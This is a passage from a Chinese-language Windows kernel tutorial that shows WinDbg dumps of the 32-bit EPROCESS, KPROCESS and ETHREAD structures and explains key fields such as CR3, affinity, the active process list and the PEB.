HardwareTrigger  : Uint4B</span><br><span class="line">   <span class="number">+0x110</span> PhysicalVadRoot  : Ptr32 _MM_AVL_TABLE</span><br><span class="line">   <span class="number">+0x114</span> CloneRoot        : Ptr32 Void</span><br><span class="line">   <span class="number">+0x118</span> NumberOfPrivatePages : Uint4B</span><br><span class="line">   <span class="number">+0x11c</span> NumberOfLockedPages : Uint4B</span><br><span class="line">   <span class="number">+0x120</span> Win32Process     : Ptr32 Void</span><br><span class="line">   <span class="number">+0x124</span> Job              : Ptr32 _EJOB</span><br><span class="line">   <span class="number">+0x128</span> SectionObject    : Ptr32 Void</span><br><span class="line">   <span class="number">+0x12c</span> SectionBaseAddress : Ptr32 Void</span><br><span class="line">   <span class="number">+0x130</span> Cookie           : Uint4B</span><br><span class="line">   <span class="number">+0x134</span> Spare8           : Uint4B</span><br><span class="line">   <span class="number">+0x138</span> WorkingSetWatch  : Ptr32 _PAGEFAULT_HISTORY</span><br><span class="line">   <span class="number">+0x13c</span> Win32WindowStation : Ptr32 Void</span><br><span class="line">   <span class="number">+0x140</span> InheritedFromUniqueProcessId : Ptr32 Void</span><br><span class="line">   <span class="number">+0x144</span> LdtInformation   : Ptr32 Void</span><br><span class="line">   <span class="number">+0x148</span> VdmObjects       : Ptr32 Void</span><br><span class="line">   <span class="number">+0x14c</span> ConsoleHostProcess : Uint4B</span><br><span class="line">   <span class="number">+0x150</span> DeviceMap        : Ptr32 Void</span><br><span class="line">   <span class="number">+0x154</span> EtwDataSource    : Ptr32 Void</span><br><span class="line">   <span class="number">+0x158</span> FreeTebHint      : Ptr32 Void</span><br><span class="line">   <span class="number">+0x160</span> PageDirectoryPte : Uint8B</span><br><span class="line">   <span class="number">+0x168</span> Session          : Ptr32 Void</span><br><span class="line">   <span class="number">+0x16c</span> ImageFileName    : [<span class="number">15</span>] UChar</span><br><span class="line">   <span class="number">+0x17b</span> PriorityClass    : UChar</span><br><span class="line">   <span class="number">+0x17c</span> JobLinks         : _LIST_ENTRY</span><br><span class="line">   <span class="number">+0x184</span> LockedPagesList  : Ptr32 Void</span><br><span class="line">   <span class="number">+0x188</span> ThreadListHead   : _LIST_ENTRY</span><br><span class="line">   <span class="number">+0x190</span> SecurityPort     : Ptr32 Void</span><br><span class="line">   <span class="number">+0x194</span> PaeTop           : Ptr32 Void</span><br><span class="line">   <span class="number">+0x198</span> ActiveThreads    : Uint4B</span><br><span class="line">   <span class="number">+0x19c</span> ImagePathHash    : Uint4B</span><br><span class="line">   <span class="number">+0x1a0</span> DefaultHardErrorProcessing : Uint4B</span><br><span class="line">   <span class="number">+0x1a4</span> LastThreadExitStatus : Int4B</span><br><span class="line">   <span class="number">+0x1a8</span> Peb              : Ptr32 _PEB</span><br><span class="line">   <span class="number">+0x1ac</span> PrefetchTrace    : _EX_FAST_REF</span><br><span class="line">   <span class="number">+0x1b0</span> ReadOperationCount : _LARGE_INTEGER</span><br><span class="line">   <span class="number">+0x1b8</span> WriteOperationCount : _LARGE_INTEGER</span><br><span class="line">   <span class="number">+0x1c0</span> OtherOperationCount : _LARGE_INTEGER</span><br><span class="line">   <span class="number">+0x1c8</span> ReadTransferCount : _LARGE_INTEGER</span><br><span class="line">   <span class="number">+0x1d0</span> WriteTransferCount : _LARGE_INTEGER</span><br><span class="line">   <span class="number">+0x1d8</span> OtherTransferCount : _LARGE_INTEGER</span><br><span class="line">   <span class="number">+0x1e0</span> CommitChargeLimit : Uint4B</span><br><span class="line">   <span class="number">+0x1e4</span> CommitChargePeak : Uint4B</span><br><span class="line">   <span class="number">+0x1e8</span> AweInfo          : Ptr32 Void</span><br><span class="line">   <span class="number">+0x1ec</span> SeAuditProcessCreationInfo : _SE_AUDIT_PROCESS_CREATION_INFO</span><br><span class="line">   <span class="number">+0x1f0</span> Vm               : _MMSUPPORT</span><br><span class="line">   <span class="number">+0x25c</span> MmProcessLinks   : _LIST_ENTRY</span><br><span class="line">   <span class="number">+0x264</span> HighestUserAddress : Ptr32 Void</span><br><span class="line">   <span class="number">+0x268</span> ModifiedPageCount : Uint4B</span><br><span class="line">   <span class="number">+0x26c</span> Flags2           : Uint4B</span><br><span class="line">   <span class="number">+0x26c</span> JobNotReallyActive : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> AccountingFolded : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> NewProcessReported : Pos <span class="number">2</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> ExitProcessReported : Pos <span class="number">3</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> ReportCommitChanges : Pos <span class="number">4</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> LastReportMemory : Pos <span class="number">5</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> ReportPhysicalPageChanges : Pos <span class="number">6</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> HandleTableRundown : Pos <span class="number">7</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> NeedsHandleRundown : Pos <span class="number">8</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> RefTraceEnabled  : Pos <span class="number">9</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> NumaAware        : Pos <span class="number">10</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> ProtectedProcess : Pos <span class="number">11</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> DefaultPagePriority : Pos <span class="number">12</span>, <span class="number">3</span> Bits</span><br><span class="line">   <span class="number">+0x26c</span> PrimaryTokenFrozen : Pos <span class="number">15</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> ProcessVerifierTarget : Pos <span class="number">16</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> StackRandomizationDisabled : Pos <span class="number">17</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> AffinityPermanent : Pos <span class="number">18</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> AffinityUpdateEnable : Pos <span class="number">19</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> PropagateNode    : Pos <span class="number">20</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> ExplicitAffinity : Pos <span class="number">21</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> Spare1           : Pos <span class="number">22</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> ForceRelocateImages : Pos <span class="number">23</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> DisallowStrippedImages : Pos <span class="number">24</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> LowVaAccessible  : Pos <span class="number">25</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> RestrictIndirectBranchPrediction : Pos <span class="number">26</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> AddressPolicyFrozen : Pos <span class="number">27</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x26c</span> SpeculativeStoreBypassDisable : Pos <span class="number">28</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> Flags            : Uint4B</span><br><span class="line">   <span class="number">+0x270</span> CreateReported   : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> NoDebugInherit   : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> ProcessExiting   : Pos <span class="number">2</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> ProcessDelete    : Pos <span class="number">3</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> Wow64SplitPages  : Pos <span class="number">4</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> VmDeleted        : Pos <span class="number">5</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> OutswapEnabled   : Pos <span class="number">6</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> Outswapped       : Pos <span class="number">7</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> ForkFailed       : Pos <span class="number">8</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> Wow64VaSpace4Gb  : Pos <span class="number">9</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> AddressSpaceInitialized : Pos <span class="number">10</span>, <span class="number">2</span> Bits</span><br><span class="line">   <span class="number">+0x270</span> SetTimerResolution : Pos <span class="number">12</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> BreakOnTermination : Pos <span class="number">13</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> DeprioritizeViews : Pos <span class="number">14</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> WriteWatch       : Pos <span class="number">15</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> ProcessInSession : Pos <span class="number">16</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> OverrideAddressSpace : Pos <span class="number">17</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> HasAddressSpace  : Pos <span class="number">18</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> LaunchPrefetched : Pos <span class="number">19</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> InjectInpageErrors : Pos <span class="number">20</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> VmTopDown        : Pos <span class="number">21</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> ImageNotifyDone  : Pos <span class="number">22</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> PdeUpdateNeeded  : Pos <span class="number">23</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> VdmAllowed       : Pos <span class="number">24</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> CrossSessionCreate : Pos <span class="number">25</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> ProcessInserted  : Pos <span class="number">26</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> DefaultIoPriority : Pos <span class="number">27</span>, <span class="number">3</span> Bits</span><br><span class="line">   <span class="number">+0x270</span> ProcessSelfDelete : Pos <span class="number">30</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x270</span> SetTimerResolutionLink : Pos <span class="number">31</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x274</span> ExitStatus       : Int4B</span><br><span class="line">   <span class="number">+0x278</span> VadRoot          : _MM_AVL_TABLE</span><br><span class="line">   <span class="number">+0x298</span> AlpcContext      : _ALPC_PROCESS_CONTEXT</span><br><span class="line">   <span class="number">+0x2a8</span> TimerResolutionLink : _LIST_ENTRY</span><br><span class="line">   <span class="number">+0x2b0</span> RequestedTimerResolution : Uint4B</span><br><span class="line">   <span class="number">+0x2b4</span> ActiveThreadsHighWatermark : Uint4B</span><br><span class="line">   <span class="number">+0x2b8</span> SmallestTimerResolution : Uint4B</span><br><span class="line">   <span class="number">+0x2bc</span> TimerResolutionStackRecord : Ptr32 _PO_DIAG_STACK_RECORD</span><br><span class="line">   <span class="number">+0x2c0</span> SequenceNumber   : Uint8B</span><br><span class="line">   <span class="number">+0x2c8</span> CreateInterruptTime : Uint8B</span><br><span class="line">   <span class="number">+0x2d0</span> CreateUnbiasedInterruptTime : Uint8B</span><br><span class="line">   <span class="number">+0x2d8</span> SecurityDomain   : Uint8B</span><br></pre></td></tr></table></figure><p>与 <code>ETHREAD</code> 结构同理，里面也包了一个 <code>KPROCESS</code> 结构叫进程控制块（Process Control Block，PCB）。</p><p>同样来看看该结构的定义</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _KPROCESS</span><br><span class="line">nt!_KPROCESS</span><br><span class="line">   <span class="number">+0x000</span> Header           : _DISPATCHER_HEADER</span><br><span class="line">   <span class="number">+0x010</span> ProfileListHead  : _LIST_ENTRY</span><br><span class="line">   <span class="number">+0x018</span> DirectoryTableBase : Uint4B</span><br><span class="line">   <span class="number">+0x01c</span> LdtDescriptor    : _KGDTENTRY</span><br><span class="line">   <span class="number">+0x024</span> Int21Descriptor  : _KIDTENTRY</span><br><span class="line">   <span class="number">+0x02c</span> ThreadListHead   : _LIST_ENTRY</span><br><span class="line">   <span class="number">+0x034</span> ProcessLock      : Uint4B</span><br><span class="line">   <span class="number">+0x038</span> Affinity         : _KAFFINITY_EX</span><br><span class="line">   <span class="number">+0x044</span> ReadyListHead    : _LIST_ENTRY</span><br><span class="line">   <span class="number">+0x04c</span> SwapListEntry    : _SINGLE_LIST_ENTRY</span><br><span class="line">   <span class="number">+0x050</span> ActiveProcessors : _KAFFINITY_EX</span><br><span class="line">   <span class="number">+0x05c</span> AutoAlignment    : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x05c</span> DisableBoost     : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x05c</span> DisableQuantum   : Pos <span class="number">2</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x05c</span> ActiveGroupsMask : Pos <span class="number">3</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x05c</span> ReservedFlags    : Pos <span class="number">4</span>, <span class="number">28</span> Bits</span><br><span class="line">   <span class="number">+0x05c</span> ProcessFlags     : Int4B</span><br><span class="line">   <span class="number">+0x060</span> BasePriority     : Char</span><br><span class="line">   <span class="number">+0x061</span> QuantumReset     : Char</span><br><span class="line">   <span class="number">+0x062</span> Visited          : UChar</span><br><span class="line">   <span class="number">+0x063</span> Unused3          : UChar</span><br><span class="line">   <span class="number">+0x064</span> ThreadSeed       : [<span class="number">1</span>] Uint4B</span><br><span class="line">   <span class="number">+0x068</span> IdealNode        : [<span class="number">1</span>] Uint2B</span><br><span class="line">   <span class="number">+0x06a</span> IdealGlobalNode  : Uint2B</span><br><span class="line">   <span class="number">+0x06c</span> Flags            : _KEXECUTE_OPTIONS</span><br><span class="line">   <span class="number">+0x06d</span> AddressPolicy    : UChar</span><br><span class="line">   <span class="number">+0x06e</span> IopmOffset       : Uint2B</span><br><span class="line">   <span class="number">+0x070</span> Unused4          : Uint4B</span><br><span class="line">   <span class="number">+0x074</span> StackCount       : _KSTACK_COUNT</span><br><span class="line">   <span class="number">+0x078</span> ProcessListEntry : _LIST_ENTRY</span><br><span class="line">   <span class="number">+0x080</span> CycleTime        : Uint8B</span><br><span class="line">   <span class="number">+0x088</span> KernelTime       : Uint4B</span><br><span class="line">   <span class="number">+0x08c</span> UserTime         : Uint4B</span><br><span class="line">   <span class="number">+0x090</span> VdmTrapcHandler  : Ptr32 Void</span><br></pre></td></tr></table></figure><p>介绍几个相对比较重要的成员信息。</p><h3 id="成员信息"><a href="#成员信息" class="headerlink" title="成员信息"></a>成员信息</h3><ul><li>Header：可等待对象，比如Mutex互斥体，Event事件等。</li><li>DirectoryTableBase：页目录表的基址，也就是所谓的<code>CR3</code>。</li><li>LdtDescriptor &#x2F; Int21Descriptor：历史遗留问题，16位<code>Windows</code>段选择子不够，每个进程都有一个<code>LDT</code>表，<code>Int21Descriptor</code>是<code>DOS</code>下要用的。</li><li>Affinity：保存该进程可以在哪个CPU上跑，从最低位到最高位（分别表示 0 号，1 号…n 号 CPU），对应的每一位中，置 1 表示可以，置 0 表示不可以。32 位系统该字段 4 个字节 32 位，所以最多支持 32 核 CPU，64 位系统同理也只能支持 64 核，除非后续扩充了其它字段。例如，该字段为 5，则表示该进程只能在 0 号和 2 号 CPU 上跑。</li><li>BasePriority：基础优先级或最低优先级，该进程中的所有线程最起码的优先级。</li><li>UniqueProcessId：进程的编号，也就是任务管理器中显示的<code>PID</code>。</li><li>ActiveProcessLinks：所有的活动进程都连接在一起，构成的双向链表。全局变量 <code>PsActiveProcessHead</code> 指向这个全局链的表头。如下是示意图：</li></ul><img src="/2025/01/24/WindowsProcess1/1.png" class=""><ul><li>VadRoot：指示了进程的线性地址的使用情况和记录。</li><li>DebugPort &#x2F; ExceptionPort：调试相关字段。</li><li>ObjectTable：句柄表，装着内核对象句柄，是用来标识某个内核对象的一个<code>id</code>，同一个对象的该<code>id</code>对于每个进程是不同的。后面的教程将会对句柄表进行讲解。</li><li>ImageFileName：进程镜像文件名，最多16个字节。</li><li>ActiveThreads：活动线程的数量。</li><li>Peb：即 <code>Process Environment Block</code>，进程环境块。是进程在3环的一个结构体，里面包含了进程的模块列表、是否处于调试状态等信息。</li></ul><h2 id="ETHREAD"><a href="#ETHREAD" class="headerlink" title="ETHREAD"></a>ETHREAD</h2><h3 id="定义描述-1"><a href="#定义描述-1" class="headerlink" title="定义描述"></a>定义描述</h3><p>虽然在系统调用那一章节介绍过了，但是还是再额外提及一下。</p><p>结构体描述：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _ETHREAD</span><br><span class="line">nt!_ETHREAD</span><br><span class="line">   <span class="number">+0x000</span> Tcb              : _KTHREAD</span><br><span class="line">   <span class="number">+0x200</span> CreateTime       : _LARGE_INTEGER</span><br><span class="line">   <span class="number">+0x208</span> ExitTime         : _LARGE_INTEGER</span><br><span class="line">   <span class="number">+0x208</span> KeyedWaitChain   : _LIST_ENTRY</span><br><span class="line">   <span class="number">+0x210</span> ExitStatus       : Int4B</span><br><span class="line">   <span class="number">+0x214</span> PostBlockList    : _LIST_ENTRY</span><br><span class="line">   <span class="number">+0x214</span> ForwardLinkShadow : Ptr32 Void</span><br><span class="line">   <span class="number">+0x218</span> StartAddress     : Ptr32 Void</span><br><span class="line">   <span class="number">+0x21c</span> TerminationPort  : Ptr32 _TERMINATION_PORT</span><br><span class="line">   <span class="number">+0x21c</span> ReaperLink       : Ptr32 _ETHREAD</span><br><span class="line">   <span class="number">+0x21c</span> KeyedWaitValue   : Ptr32 Void</span><br><span class="line">   <span class="number">+0x220</span> ActiveTimerListLock : Uint4B</span><br><span class="line">   <span class="number">+0x224</span> ActiveTimerListHead : _LIST_ENTRY</span><br><span class="line">   <span class="number">+0x22c</span> Cid              : _CLIENT_ID</span><br><span class="line">   <span class="number">+0x234</span> KeyedWaitSemaphore : _KSEMAPHORE</span><br><span class="line">   <span class="number">+0x234</span> AlpcWaitSemaphore : _KSEMAPHORE</span><br><span class="line">   <span class="number">+0x248</span> ClientSecurity   : _PS_CLIENT_SECURITY_CONTEXT</span><br><span class="line">   <span class="number">+0x24c</span> IrpList          : _LIST_ENTRY</span><br><span class="line">   <span class="number">+0x254</span> TopLevelIrp      : Uint4B</span><br><span class="line">   <span class="number">+0x258</span> DeviceToVerify   : Ptr32 _DEVICE_OBJECT</span><br><span class="line">   <span class="number">+0x25c</span> CpuQuotaApc      : Ptr32 _PSP_CPU_QUOTA_APC</span><br><span class="line">   <span class="number">+0x260</span> Win32StartAddress : Ptr32 Void</span><br><span class="line">   <span class="number">+0x264</span> LegacyPowerObject : Ptr32 Void</span><br><span class="line">   <span class="number">+0x268</span> ThreadListEntry  : _LIST_ENTRY</span><br><span class="line">   <span class="number">+0x270</span> RundownProtect   : _EX_RUNDOWN_REF</span><br><span class="line">   <span class="number">+0x274</span> ThreadLock       : _EX_PUSH_LOCK</span><br><span class="line">   <span class="number">+0x278</span> ReadClusterSize  : Uint4B</span><br><span class="line">   <span class="number">+0x27c</span> MmLockOrdering   : Int4B</span><br><span class="line">   <span class="number">+0x280</span> CrossThreadFlags : Uint4B</span><br><span class="line">   <span class="number">+0x280</span> Terminated       : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x280</span> ThreadInserted   : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x280</span> HideFromDebugger : Pos <span class="number">2</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x280</span> ActiveImpersonationInfo : Pos <span class="number">3</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x280</span> Reserved         : Pos <span class="number">4</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x280</span> HardErrorsAreDisabled : Pos <span class="number">5</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x280</span> BreakOnTermination : Pos <span class="number">6</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x280</span> SkipCreationMsg  : Pos <span class="number">7</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x280</span> SkipTerminationMsg : Pos <span class="number">8</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x280</span> CopyTokenOnOpen  : Pos <span class="number">9</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x280</span> ThreadIoPriority : Pos <span class="number">10</span>, <span class="number">3</span> Bits</span><br><span class="line">   <span class="number">+0x280</span> ThreadPagePriority : Pos <span class="number">13</span>, <span class="number">3</span> Bits</span><br><span class="line">   <span class="number">+0x280</span> RundownFail      : Pos <span class="number">16</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x280</span> NeedsWorkingSetAging : Pos <span class="number">17</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x284</span> SameThreadPassiveFlags : Uint4B</span><br><span class="line">   <span class="number">+0x284</span> ActiveExWorker   : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x284</span> ExWorkerCanWaitUser : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x284</span> MemoryMaker      : Pos <span class="number">2</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x284</span> ClonedThread     : Pos <span class="number">3</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x284</span> KeyedEventInUse  : Pos <span class="number">4</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x284</span> RateApcState     : Pos <span class="number">5</span>, <span class="number">2</span> Bits</span><br><span class="line">   <span class="number">+0x284</span> SelfTerminate    : Pos <span class="number">7</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x288</span> SameThreadApcFlags : Uint4B</span><br><span class="line">   <span class="number">+0x288</span> Spare            : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x288</span> StartAddressInvalid : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x288</span> EtwPageFaultCalloutActive : Pos <span class="number">2</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x288</span> OwnsProcessWorkingSetExclusive : Pos <span class="number">3</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x288</span> OwnsProcessWorkingSetShared : Pos <span class="number">4</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x288</span> OwnsSystemCacheWorkingSetExclusive : Pos <span class="number">5</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x288</span> OwnsSystemCacheWorkingSetShared : Pos <span class="number">6</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x288</span> OwnsSessionWorkingSetExclusive : Pos <span class="number">7</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x289</span> OwnsSessionWorkingSetShared : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x289</span> OwnsProcessAddressSpaceExclusive : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x289</span> OwnsProcessAddressSpaceShared : Pos <span class="number">2</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x289</span> SuppressSymbolLoad : Pos <span class="number">3</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x289</span> Prefetching      : Pos <span class="number">4</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x289</span> OwnsDynamicMemoryShared : Pos <span class="number">5</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x289</span> OwnsChangeControlAreaExclusive : Pos <span class="number">6</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x289</span> OwnsChangeControlAreaShared : Pos <span class="number">7</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x28a</span> OwnsPagedPoolWorkingSetExclusive : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x28a</span> OwnsPagedPoolWorkingSetShared : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x28a</span> OwnsSystemPtesWorkingSetExclusive : Pos <span class="number">2</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x28a</span> OwnsSystemPtesWorkingSetShared : Pos <span class="number">3</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x28a</span> TrimTrigger      : Pos <span class="number">4</span>, <span class="number">2</span> Bits</span><br><span class="line">   <span class="number">+0x28a</span> Spare1           : Pos <span class="number">6</span>, <span class="number">2</span> Bits</span><br><span class="line">   <span class="number">+0x28b</span> PriorityRegionActive : UChar</span><br><span class="line">   <span class="number">+0x28c</span> CacheManagerActive : UChar</span><br><span class="line">   <span class="number">+0x28d</span> DisablePageFaultClustering : UChar</span><br><span class="line">   <span class="number">+0x28e</span> ActiveFaultCount : UChar</span><br><span class="line">   <span class="number">+0x28f</span> LockOrderState   : UChar</span><br><span class="line">   <span class="number">+0x290</span> AlpcMessageId    : Uint4B</span><br><span class="line">   <span class="number">+0x294</span> AlpcMessage      : Ptr32 Void</span><br><span class="line">   <span class="number">+0x294</span> AlpcReceiveAttributeSet : Uint4B</span><br><span class="line">   <span class="number">+0x298</span> AlpcWaitListEntry : _LIST_ENTRY</span><br><span class="line">   <span class="number">+0x2a0</span> CacheManagerCount : Uint4B</span><br><span class="line">   <span class="number">+0x2a4</span> IoBoostCount     : Uint4B</span><br><span class="line">   <span class="number">+0x2a8</span> IrpListLock      : Uint4B</span><br><span class="line">   <span class="number">+0x2ac</span> ReservedForSynchTracking : Ptr32 Void</span><br><span class="line">   <span class="number">+0x2b0</span> CmCallbackListHead : _SINGLE_LIST_ENTRY</span><br><span class="line">   <span class="number">+0x2b4</span> 